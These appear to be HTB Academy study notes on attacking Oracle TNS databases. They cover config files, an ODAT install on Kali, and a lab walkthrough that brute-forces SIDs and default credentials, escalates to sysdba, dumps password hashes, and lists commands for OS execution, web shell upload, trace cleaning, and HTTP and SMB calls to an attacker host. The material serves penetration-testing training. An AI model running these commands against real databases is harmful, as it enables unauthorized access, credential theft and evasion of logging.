# Oracle TNS (Transparent Network Substrate)

> Communication protocol facilitating communication between Oracle databases and applications over networks.

---

## Overview

**Oracle Transparent Network Substrate (TNS)** is a communication protocol introduced as part of Oracle Net Services software suite.

| Characteristic | Details |
|----------------|---------|
| **Purpose** | Facilitates communication between Oracle databases and client applications |
| **Protocols Supported** | TCP/IP, UDP, IPX/SPX, AppleTalk |
| **Security** | Built-in encryption mechanism for data transmission |
| **Industries** | Healthcare, Finance, Retail (large, complex databases) |

### TNS Capabilities

| Feature | Description |
|---------|-------------|
| **Name Resolution** | Resolves service names to network addresses |
| **Connection Management** | Manages database connections |
| **Load Balancing** | Distributes connections across instances |
| **Security** | SSL/TLS encryption, IPv6 support |

---

## Default Port

| Port | Protocol | Description |
|------|----------|-------------|
| **TCP 1521** | Oracle TNS | Default TNS listener port |

---

## Configuration Files

Configuration files are typically located in `$ORACLE_HOME/network/admin` directory.

### tnsnames.ora (Client-Side)

Used by client-side Oracle Net Services to resolve service names to network addresses.

```
ORCL =
  (DESCRIPTION =
    (ADDRESS_LIST =
      (ADDRESS = (PROTOCOL = TCP)(HOST = 10.129.11.102)(PORT = 1521))
    )
    (CONNECT_DATA =
      (SERVER = DEDICATED)
      (SERVICE_NAME = orcl)
    )
  )
```

### listener.ora (Server-Side)

Defines the listener process properties and parameters for receiving incoming client requests.

```
SID_LIST_LISTENER =
  (SID_LIST =
    (SID_DESC =
      (SID_NAME = PDB1)
      (ORACLE_HOME = C:\oracle\product\19.0.0\dbhome_1)
      (GLOBAL_DBNAME = PDB1)
      (SID_DIRECTORY_LIST =
        (SID_DIRECTORY =
          (DIRECTORY_TYPE = TNS_ADMIN)
          (DIRECTORY = C:\oracle\product\19.0.0\dbhome_1\network\admin)
        )
      )
    )
  )

LISTENER =
  (DESCRIPTION_LIST =
    (DESCRIPTION =
      (ADDRESS = (PROTOCOL = TCP)(HOST = orcl.inlanefreight.htb)(PORT = 1521))
      (ADDRESS = (PROTOCOL = IPC)(KEY = EXTPROC1521))
    )
  )

ADR_BASE_LISTENER = C:\oracle
```

---

## Default Configuration

| Setting | Details |
|---------|---------|
| **Default Port** | TCP 1521 (can be changed) |
| **Protocols** | TCP/IP, UDP, IPX/SPX, AppleTalk |
| **Remote Management** | Enabled in Oracle 8i/9i, disabled in 10g/11g |
| **Authentication** | Hostnames, IP addresses, usernames/passwords |
| **Encryption** | Oracle Net Services encrypts client-server communication |

### Default Passwords to Remember

| Service/Version | Default Password |
|-----------------|------------------|
| **Oracle 9** | `CHANGE_ON_INSTALL` |
| **Oracle 10** | No default password |
| **Oracle DBSNMP** | `dbsnmp` |

---

## TNS Configuration Settings Reference

| Setting | Description |
|---------|-------------|
| `DESCRIPTION` | Descriptor providing database name and connection type |
| `ADDRESS` | Network address (hostname and port) |
| `PROTOCOL` | Network protocol (TCP, UDP, etc.) |
| `PORT` | Port number for communication |
| `CONNECT_DATA` | Connection attributes (service name, SID, protocol) |
| `INSTANCE_NAME` | Database instance name to connect to |
| `SERVICE_NAME` | Service name client wants to connect to |
| `SERVER` | Server type (dedicated or shared) |
| `USER` | Authentication username |
| `PASSWORD` | Authentication password |
| `SECURITY` | Connection security type |
| `VALIDATE_CERT` | Whether to validate SSL/TLS certificate |
| `SSL_VERSION` | SSL/TLS version to use |
| `CONNECT_TIMEOUT` | Time limit for establishing connection (seconds) |
| `RECEIVE_TIMEOUT` | Time limit for receiving response (seconds) |
| `SEND_TIMEOUT` | Time limit for sending request (seconds) |
| `SQLNET.EXPIRE_TIME` | Time limit to detect failed connection (seconds) |
| `TRACE_LEVEL` | Tracing level for connection |
| `TRACE_DIRECTORY` | Directory for trace files |
| `TRACE_FILE_NAME` | Name of trace file |
| `LOG_FILE` | File for log information |

---

## PL/SQL Exclusion List

Oracle databases can be protected using **PL/SQL Exclusion List (PlsqlExclusionList)**:

- User-created text file placed in `$ORACLE_HOME/sqldeveloper` directory
- Contains names of PL/SQL packages or types to exclude from execution
- Serves as a blacklist for Oracle Application Server access

---

## System Identifier (SID)

| Aspect | Details |
|--------|---------|
| **Purpose** | Unique name identifying a particular database instance |
| **Usage** | Client specifies SID in connection string |
| **Default** | If not specified, uses value from tnsnames.ora |
| **Importance** | Incorrect SID = connection failure |

---

## Setting Up ODAT (Kali Linux)

**Oracle Database Attacking Tool (ODAT)** - Open-source penetration testing tool for enumerating and exploiting Oracle database vulnerabilities.

### ODAT Capabilities

| Category | Features |
|----------|----------|
| **Enumeration** | TNS listener interaction, SID/Service Name guessing |
| **Authentication** | Password guessing/brute forcing, hashed password stealing |
| **File Operations** | Upload, download, delete files on DB server |
| **Command Execution** | Via Java, DBMS_SCHEDULER, external tables |
| **Network** | Port scanning via UTL_HTTP, UTL_TCP, HTTPURITYPE |
| **Data Access** | Read files via CTXSYS, search databases/tables/columns |
| **Post-Exploitation** | Privilege escalation, SMB auth capture, CVE exploitation |
| **Cleanup** | Cleaning traces and logs, unwrapping PL/SQL source code |

### Installation on Kali (2025.2 ARM64/aarch64 - Parallels VM)

```bash
# Step 1: Install system dependencies
sudo apt-get update
sudo apt-get install -y build-essential python3-dev libaio1t64 libgmp-dev python3-scapy alien

# Step 2: Install Oracle Instant Client (REQUIRED - cx_Oracle needs libclntsh.so)
cd ~
wget https://yum.oracle.com/repo/OracleLinux/OL9/oracle/instantclient23/aarch64/getPackage/oracle-instantclient-basiclite-23.26.1.0.0-1.el9.aarch64.rpm
sudo alien -i oracle-instantclient-basiclite-23.26.1.0.0-1.el9.aarch64.rpm

# Set library path
echo 'export LD_LIBRARY_PATH=/usr/lib/oracle/23/client64/lib:$LD_LIBRARY_PATH' >> ~/.zshrc
source ~/.zshrc
sudo sh -c "echo /usr/lib/oracle/23/client64/lib > /etc/ld.so.conf.d/oracle-instantclient.conf"
sudo ldconfig

# Step 3: Download cx_Oracle source
cd ~
wget https://files.pythonhosted.org/packages/source/c/cx_Oracle/cx_Oracle-8.3.0.tar.gz
tar xzf cx_Oracle-8.3.0.tar.gz

# Step 4: Clone ODAT and initialize submodules
cd ~
git clone https://github.com/quentinhardy/odat.git
cd odat
git submodule init
git submodule update

# Step 5: Create Python venv and install all dependencies
cd ~/odat
python3 -m venv venv
source venv/bin/activate

# IMPORTANT: Pin setuptools below 81 (v82+ removed pkg_resources which cx_Oracle needs)
pip install "setuptools<81" wheel

# Install cx_Oracle from source
sudo chown -R $USER:$USER ~/cx_Oracle-8.3.0
cd ~/cx_Oracle-8.3.0
rm -rf build
pip install --no-build-isolation .

# Install remaining Python dependencies
cd ~/odat
pip install python-libnmap colorlog termcolor passlib pycryptodome pyasyncore

# Create Crypto symlink (ODAT uses old pycrypto import paths)
cd venv/lib/python3.13/site-packages
ln -s Cryptodome Crypto
cd ~/odat

# Step 6: Fix the shebang for venv compatibility
sed -i '1s|#!/usr/bin/python|#!/usr/bin/env python3|' odat.py
```
> One-time ODAT install on Kali ARM64: system deps, Oracle Instant Client, cx_Oracle from source, the ODAT repo, and a venv. Adjust the Instant Client/cx_Oracle versions and Python path to match your distro.

### Running ODAT

```bash
cd ~/odat
source venv/bin/activate
python3 odat.py -h
```
> Activates the ODAT virtualenv and prints its help/module list to confirm the install works. Run from the ODAT directory; no values to change.

> **Note:** Always use `python3 odat.py` (not `./odat.py`) because the default shebang points to `#!/usr/bin/python` which bypasses the venv. Fix the shebang with the sed command above to use `./odat.py` directly.

```
            _  __   _  ___ 
           / \|  \ / \|_ _|
          ( o ) o ) o || | 
           \_/|__/|_n_||_| 
-------------------------------------------
  _        __           _           ___ 
 / \      |  \         / \         |_ _|
( o )       o )         o |         | | 
 \_/racle |__/atabase |_n_|ttacking |_|ool 
-------------------------------------------
```

### ODAT Troubleshooting

| Error | Fix |
|-------|-----|
| `DPI-1047: Cannot locate a 64-bit Oracle Client library` | Install Oracle Instant Client (Step 2) and set `LD_LIBRARY_PATH` |
| `No module named 'pkg_resources'` | `pip install "setuptools<81"` |
| `No module named 'Crypto'` | `ln -s Cryptodome Crypto` in site-packages |
| `No module named 'asyncore'` | `pip install pyasyncore` (removed in Python 3.12+) |
| `No module named 'cx_Oracle'` | Install cx_Oracle inside the venv, not system-wide |
| Permission denied on build | `chown` the source dir + `rm -rf build/` |
| `No module named 'libnmap'` | `pip install python-libnmap` |
| scapy warning | `sudo apt install python3-scapy` system-wide |

### ODAT Usage Examples

```bash
# Scan all modules against a target
python3 odat.py all -s <target_ip> -p 1521

# Guess SIDs on a target
python3 odat.py sidguesser -s <target_ip> -p 1521

# Guess passwords with known SID
python3 odat.py passwordguesser -s <target_ip> -p 1521 -d <SID>

# Execute system commands via Java
python3 odat.py java -s <target_ip> -p 1521 -d <SID> -U <user> -P <pass> --exec <command>

# Upload a file
python3 odat.py utlfile -s <target_ip> -p 1521 -d <SID> -U <user> -P <pass> --putFile <remote_dir> <remote_file> <local_file>

# Download a file
python3 odat.py utlfile -s <target_ip> -p 1521 -d <SID> -U <user> -P <pass> --getFile <remote_dir> <remote_file> <local_file>

# Steal password hashes
python3 odat.py passwordstealer -s <target_ip> -p 1521 -d <SID> -U <user> -P <pass>

# Search for keywords in DB
python3 odat.py search -s <target_ip> -p 1521 -d <SID> -U <user> -P <pass> --keywords "password,credit_card,ssn"
```
> Reference set of ODAT module invocations (scan-all, SID guess, password guess, Java exec, file up/download, hash steal, keyword search). Replace `<target_ip>`, `<SID>`, `<user>`, `<pass>` with your values.

### ODAT Quick Navigation Guide

#### Step 0: Launch ODAT

Always run ODAT from its install directory. The `sidguesser` and `passwordguesser` modules load wordlists relative to the script location, so running from `~/odat` avoids file-not-found issues.

```bash
cd ~/odat && source venv/bin/activate
python3 odat.py -h
```
> Always launch ODAT from its install dir so module wordlists resolve correctly; activates the venv and shows help. No values to change.

#### Step-by-Step Attack Flow

The typical workflow when using ODAT follows this order:

```
0. cd ~/odat && activate venv  -->  1. Discover TNS Listener  -->  2. Find SIDs  -->  3. Get Credentials  -->  4. Exploit
```

#### Phase 1: Discovery - Is Oracle Running?

```bash
# Use Nmap first to confirm port 1521 is open
sudo nmap -p1521 -sV <target_ip> --open

# Or use ODAT tnscmd to interact with the listener directly
python3 odat.py tnscmd -s <target_ip> -p 1521 --ping
python3 odat.py tnscmd -s <target_ip> -p 1521 --version
python3 odat.py tnscmd -s <target_ip> -p 1521 --status
```
> Confirms Oracle TNS is reachable: Nmap version-scans port 1521, then ODAT `tnscmd` pings the listener and queries its version/status. Replace `<target_ip>` with your target IP.

#### Phase 2: Enumerate SIDs

You need a valid SID before you can authenticate. Guess or brute-force it:

```bash
# ODAT SID guesser (uses built-in wordlist)
python3 odat.py sidguesser -s <target_ip> -p 1521

# Nmap SID brute
sudo nmap -p1521 --script oracle-sid-brute <target_ip>
```
> Brute-forces the database SID (required before authenticating) via ODAT's built-in wordlist or the Nmap `oracle-sid-brute` script. Replace `<target_ip>` with your target IP.

Common SIDs to try manually: `XE`, `ORCL`, `ORCLCDB`, `ORCLPDB1`, `PLSExtProc`

#### Phase 3: Get Credentials

Once you have a SID, try to find valid credentials:

```bash
# ODAT password guesser (tries common Oracle default accounts)
python3 odat.py passwordguesser -s <target_ip> -p 1521 -d <SID>

# Use a custom username/password list
python3 odat.py passwordguesser -s <target_ip> -p 1521 -d <SID> --accounts-file accounts.txt
```
> Once you have a valid SID, brute-force credentials with ODAT's default account list or a custom `accounts.txt`. Replace `<target_ip>` and `<SID>`, and point `--accounts-file` at your list.

Default accounts to remember: `scott/tiger`, `system/manager`, `sys/change_on_install`, `dbsnmp/dbsnmp`

#### Phase 4: Exploit (With Valid Credentials)

Once you have creds + SID, the real fun begins. Choose your module:

```bash
# Run ALL exploit modules at once (noisy but thorough)
python3 odat.py all -s <target_ip> -p 1521 -d <SID> -U <user> -P <pass>
```
> Runs every ODAT exploit module against the target with valid creds + SID — thorough but loud. Replace `<target_ip>`, `<SID>`, `<user>`, `<pass>` with your values; add `--sysdba` if the account can use it.

Or pick specific modules:

| Goal | Module | Command |
|------|--------|---------|
| **Read a file** | `utlfile` | `python3 odat.py utlfile -s <ip> -d <SID> -U <user> -P <pass> --getFile /etc passwd /tmp/passwd` |
| **Upload a file** | `utlfile` | `python3 odat.py utlfile -s <ip> -d <SID> -U <user> -P <pass> --putFile /tmp shell.txt ./shell.txt` |
| **Delete a file** | `utlfile` | `python3 odat.py utlfile -s <ip> -d <SID> -U <user> -P <pass> --removeFile /tmp shell.txt` |
| **Execute OS command** | `java` | `python3 odat.py java -s <ip> -d <SID> -U <user> -P <pass> --exec whoami` |
| **Steal password hashes** | `passwordstealer` | `python3 odat.py passwordstealer -s <ip> -d <SID> -U <user> -P <pass>` |
| **Search DB for keywords** | `search` | `python3 odat.py search -s <ip> -d <SID> -U <user> -P <pass> --keywords "password,ssn"` |
| **Privilege escalation** | `privesc` | `python3 odat.py privesc -s <ip> -d <SID> -U <user> -P <pass>` |
| **HTTP requests from DB** | `utlhttp` | `python3 odat.py utlhttp -s <ip> -d <SID> -U <user> -P <pass> --url http://attacker/test` |
| **SMB capture** | `smb` | `python3 odat.py smb -s <ip> -d <SID> -U <user> -P <pass> --capture <attacker_ip>` |
| **Clean traces** | `clean` | `python3 odat.py clean -s <ip> -d <SID> -U <user> -P <pass>` |

#### Common Flags Reference

| Flag | Description |
|------|-------------|
| `-s` | Target IP address |
| `-p` | Target port (default 1521) |
| `-d` | SID (database name) |
| `-U` | Username |
| `-P` | Password |
| `--sysdba` | Connect with SYSDBA privileges |
| `--no-color` | Disable colored output |
| `-v` | Verbose output |

---

## Footprinting the Service

### Nmap - Basic TNS Scan

```bash
sudo nmap -p1521 -sV 10.129.204.235 --open
```
> Version-scans Oracle's default port 1521, showing only open ports, to confirm the TNS listener and its version. Swap `10.129.204.235` for your target IP.

```
PORT     STATE SERVICE    VERSION
1521/tcp open  oracle-tns Oracle TNS listener 11.2.0.2.0 (unauthorized)
```

### Nmap - SID Bruteforcing

```bash
sudo nmap -p1521 -sV 10.129.204.235 --open --script oracle-sid-brute
```
> Adds the `oracle-sid-brute` NSE script to discover valid SIDs on the listener. Swap `10.129.204.235` for your target IP.

```
PORT     STATE SERVICE    VERSION
1521/tcp open  oracle-tns Oracle TNS listener 11.2.0.2.0 (unauthorized)
| oracle-sid-brute: 
|_  XE
```

### ODAT - Full Enumeration

```bash
./odat.py all -s 10.129.204.235
```
> Runs all ODAT modules (including SID and password guessing) against the target with no creds supplied. Swap `10.129.204.235` for your target IP.

```
[+] Checking if target 10.129.204.235:1521 is well configured for a connection...
[+] According to a test, the TNS listener 10.129.204.235:1521 is well configured. Continue...

...SNIP...

[!] Notice: 'mdsys' account is locked, so skipping this username for password
[!] Notice: 'oracle_ocm' account is locked, so skipping this username for password
[!] Notice: 'outln' account is locked, so skipping this username for password
[+] Valid credentials found: scott/tiger. Continue...
```

---

## Quick Reference

| Task | Command |
|------|---------|
| **Nmap TNS scan** | `sudo nmap -p1521 -sV <target> --open` |
| **Nmap SID brute** | `sudo nmap -p1521 --script oracle-sid-brute <target>` |
| **ODAT full scan** | `./odat.py all -s <target>` |
| **Test ODAT** | `./odat.py -h` |
| **SQLplus login** | `sqlplus user/pass@<target>/SID` |
| **SQLplus as sysdba** | `sqlplus user/pass@<target>/SID as sysdba` |
| **ODAT file upload** | `./odat.py utlfile -s <target> -d SID -U user -P pass --sysdba --putFile <path> <file> <local>` |

---

## Connecting with SQLplus

Once valid credentials are found (e.g., `scott/tiger`), connect using SQLplus:

```bash
sqlplus scott/tiger@10.129.204.235/XE
```
> Connects interactively to the Oracle DB with `user/pass@host/SID`. Swap `scott/tiger` for valid creds, `10.129.204.235` for your target IP, and `XE` for the SID.

```
SQL*Plus: Release 21.0.0.0.0 - Production on Mon Mar 6 11:19:21 2023
Version 21.4.0.0.0

Copyright (c) 1982, 2021, Oracle. All rights reserved.

ERROR:
ORA-28002: the password will expire within 7 days

Connected to:
Oracle Database 11g Express Edition Release 11.2.0.2.0 - 64bit Production

SQL>
```

### Fix: libsqlplus.so Error

If you encounter: `sqlplus: error while loading shared libraries: libsqlplus.so: cannot open shared object file`

```bash
sudo sh -c "echo /usr/lib/oracle/12.2/client64/lib > /etc/ld.so.conf.d/oracle-instantclient.conf"
sudo ldconfig
```
> Fixes the `libsqlplus.so: cannot open shared object file` error by registering the Instant Client lib path with the dynamic linker. Adjust the version path to match your installed Instant Client.

---

## Database Enumeration

### List All Tables

```sql
SQL> select table_name from all_tables;
```
> Run at the `SQL>` prompt to list every table the current user can see — your starting point for data hunting. No values to change.
```
TABLE_NAME
------------------------------
DUAL
SYSTEM_PRIVILEGE_MAP
TABLE_PRIVILEGE_MAP
STMT_AUDIT_OPTION_MAP
AUDIT_ACTIONS
WRR$_REPLAY_CALL_FILTER
HS_BULKLOAD_VIEW_OBJ
HS$_PARALLEL_METADATA
HS_PARTITION_COL_NAME
HS_PARTITION_COL_TYPE
HELP
...SNIP...
```

### Check User Privileges

```sql
SQL> select * from user_role_privs;
```
> Run at the `SQL>` prompt to see the current user's granted roles — check whether you have DBA or only CONNECT/RESOURCE. No values to change.
```
USERNAME                       GRANTED_ROLE                   ADM DEF OS_
------------------------------ ------------------------------ --- --- ---
SCOTT                          CONNECT                        NO  YES NO
SCOTT                          RESOURCE                       NO  YES NO
```

---

## Privilege Escalation - Login as SYSDBA

Try connecting as System Database Admin (sysdba) for higher privileges:

```bash
sqlplus scott/tiger@10.129.204.235/XE as sysdba
```
> Reconnects with the `as sysdba` clause — many low-priv Oracle accounts can still log in as SYSDBA for full DBA access. Swap creds, IP, and SID for your values.

```
Connected to:
Oracle Database 11g Express Edition Release 11.2.0.2.0 - 64bit Production

SQL> select * from user_role_privs;

USERNAME                       GRANTED_ROLE                   ADM DEF OS_
------------------------------ ------------------------------ --- --- ---
SYS                            ADM_PARALLEL_EXECUTE_TASK      YES YES NO
SYS                            APEX_ADMINISTRATOR_ROLE        YES YES NO
SYS                            AQ_ADMINISTRATOR_ROLE          YES YES NO
SYS                            CONNECT                        YES YES NO
SYS                            DBA                            YES YES NO
SYS                            DATAPUMP_EXP_FULL_DATABASE     YES YES NO
SYS                            DATAPUMP_IMP_FULL_DATABASE     YES YES NO
SYS                            DELETE_CATALOG_ROLE            YES YES NO
SYS                            EXECUTE_CATALOG_ROLE           YES YES NO
...SNIP...
```

---

## Extract Password Hashes

With sysdba access, extract password hashes for offline cracking:

```sql
SQL> select name, password from sys.user$;
```
> Run as SYSDBA to dump every account name and password hash from `sys.user$` for offline cracking. No values to change.
```
NAME                           PASSWORD
------------------------------ ------------------------------
SYS                            FBA343E7D6C8BC9D
PUBLIC
CONNECT
RESOURCE
DBA
SYSTEM                         B5073FE1DE351687
SELECT_CATALOG_ROLE
EXECUTE_CATALOG_ROLE
DELETE_CATALOG_ROLE
OUTLN                          4A3BA55E08595C81
EXP_FULL_DATABASE
IMP_FULL_DATABASE
LOGSTDBY_ADMINISTRATOR
...SNIP...
```

---

## Practical Lab: Full Oracle TNS Attack Workflow

> Target: 10.129.205.19 | SID: XE | Creds: scott/tiger

### Step 1: Nmap - Confirm Oracle TNS is Running

```bash
sudo nmap -p1521 -sV 10.129.205.19 --open
```
> Version-scans port 1521 to confirm the Oracle TNS listener before attacking. Swap `10.129.205.19` for your target IP.

### Step 2: SID Bruteforce with ODAT

```bash
cd ~/odat && source venv/bin/activate
python3 odat.py sidguesser -s 10.129.205.19 -p 1521
```
> Activates the venv and brute-forces valid SIDs with ODAT's built-in wordlist. Swap `10.129.205.19` for your target IP.

Result: Massive SID dump including `XE`, `ORCL`, `PROD`, `DB`, and hundreds more.

### Step 3: Test Modules Without sysdba (Limited Access)

```bash
python3 odat.py all -s 10.129.205.19 -p 1521 -d XE -U scott -P tiger
```
> Runs all ODAT exploit modules with the discovered creds and SID but no `--sysdba` — shows what a low-priv account can do. Swap IP, SID, and creds for your values.

Result: Almost everything returned **KO** - `scott/tiger` only has CONNECT and RESOURCE roles.

### Step 4: Test Modules WITH sysdba (Full Access)

```bash
python3 odat.py all -s 10.129.205.19 -p 1521 -d XE -U scott -P tiger --sysdba
```
> Same all-modules run but with `--sysdba`, unlocking file read/write, command exec, and hash theft. Swap IP, SID, and creds for your values.

Result: Nearly everything returned **OK**:

| Module | Without sysdba | With sysdba |
|--------|---------------|-------------|
| **TNS Poisoning (CVE-2012-1675)** | VULNERABLE | VULNERABLE |
| **UTL_HTTP** | KO | OK |
| **HTTPURITYPE** | KO | OK |
| **UTL_FILE** | KO | OK |
| **DBMSADVISOR** | KO | OK |
| **DBMSSCHEDULER** | KO | OK |
| **CTXSYS** | KO | OK |
| **Hashed passwords** | KO | OK |
| **Password history** | KO | OK |
| **DBMS_XSLPROCESSOR** | KO | OK |
| **External table read** | KO | OK |
| **External table exec** | KO | OK |
| **DBMS_LOB read files** | KO | OK |
| **SMB capture** | KO | Perhaps |
| **Priv esc (CREATE/EXECUTE ANY)** | KO | OK |
| **Priv esc (CREATE ANY INDEX)** | KO | OK |

### Step 5: Extract All Password Hashes

```bash
python3 odat.py passwordstealer -s 10.129.205.19 -d XE -U scott -P tiger --sysdba --get-passwords
```
> Extracts every Oracle account password hash via the `passwordstealer` module (`--get-passwords` also outputs hashcat/John formats). Swap IP, SID, and creds for your values.

Result: All Oracle password hashes extracted:

```
SYS; FBA343E7D6C8BC9D
SYSTEM; B5073FE1DE351687
OUTLN; 4A3BA55E08595C81
DIP; CE4A36B8E06CA59C
ORACLE_OCM; 5A2E026A9157958C
DBSNMP; E066D214D5421CCC
APPQOSSYS; 519D632B7EE7F63A
CTXSYS; D1D21CA56994CAB6
XDB; E76A6BD999EF9FF1
ANONYMOUS; anonymous
XS$NULL; DC4FCC8CB69A6733
MDSYS; 72979A94BAD2AF80
HR; 4C6D73C3E8B0F0DA
FLOWS_FILES; 30128982EA6D4A3D
APEX_PUBLIC_USER; 4432BA224E12410A
APEX_040000; E7CE9863D7EEB0A4
SCOTT; F894844C34402B67
```

ODAT also formats hashes for cracking tools:

```
# oclHashcat format
E066D214D5421CCC:DBSNMP

# John the Ripper format
DBSNMP:E066D214D5421CCC
```

### Lab Summary

| Phase | Tool/Command | Result |
|-------|-------------|--------|
| **Discovery** | `nmap -p1521 -sV` | Oracle TNS 11.2.0.2.0 |
| **SID Enum** | `odat.py sidguesser` | Hundreds of SIDs found (XE, ORCL, etc.) |
| **Auth (low priv)** | `odat.py all` without `--sysdba` | Most modules blocked |
| **Auth (high priv)** | `odat.py all` with `--sysdba` | Full access - file read/write, command exec |
| **Hash Extraction** | `odat.py passwordstealer --get-passwords` | 17 password hashes extracted |

---

## Key Takeaways

1. **Default port is TCP 1521** - Always scan this port for Oracle services
2. **SID is critical** - Must know the SID to connect; can be bruteforced
3. **Default passwords exist** - Oracle 9 uses `CHANGE_ON_INSTALL`, DBSNMP uses `dbsnmp`
4. **Two config files** - `tnsnames.ora` (client) and `listener.ora` (server)
5. **ODAT is essential** - Comprehensive tool for Oracle enumeration and exploitation
6. **Common credentials** - `scott/tiger` is a classic default Oracle account
7. **Try sysdba** - Even low-priv users may connect as sysdba for full access
8. **Extract hashes** - Use `--get-passwords` for crackable hash formats
9. **File upload** - Use ODAT utlfile module to upload web shells if web server exists
10. **Always compare** - Run ODAT with and without `--sysdba` to see the privilege difference

---

*HTB Academy - Footprinting Module*
